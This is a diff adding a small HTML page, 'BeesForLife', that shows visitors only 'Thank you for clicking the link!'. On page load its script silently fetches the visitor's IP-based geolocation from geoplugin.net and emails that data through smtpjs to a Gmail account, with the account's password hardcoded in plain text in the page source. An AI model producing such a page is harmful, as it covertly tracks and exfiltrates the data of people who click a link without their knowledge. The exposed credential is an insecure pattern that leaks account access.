@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>BeesForLife</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script language="JavaScript" src="http://www.geoplugin.net/javascript.gp" type="text/javascript"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+	<script>
+        const sendEmail = () => {
+                let result = $.getJSON('http://www.geoplugin.net/json.gp', (data) => {
+                    Email.send({
+                    Host: "smtp.gmail.com",
+                    Username: "beesforlifeteam@gmail.com",
+                    Password: "Beesforlife",
+                    To: "beesforlifeteam@gmail.com",
+                    From: "beesforlifeteam@gmail.com",
+                    Subject: `Data from ${new Date()}`,
+                    Body: data
+                })
+                .then((message) => {
+                    alert('mail sent')
+                })
+            });
+            
+        }
+    </script>
+    
+  </head>
+  <body onload="sendEmail()">
+
+    <p>Thank you for clicking the link!</p>
+  </body>
+</html>
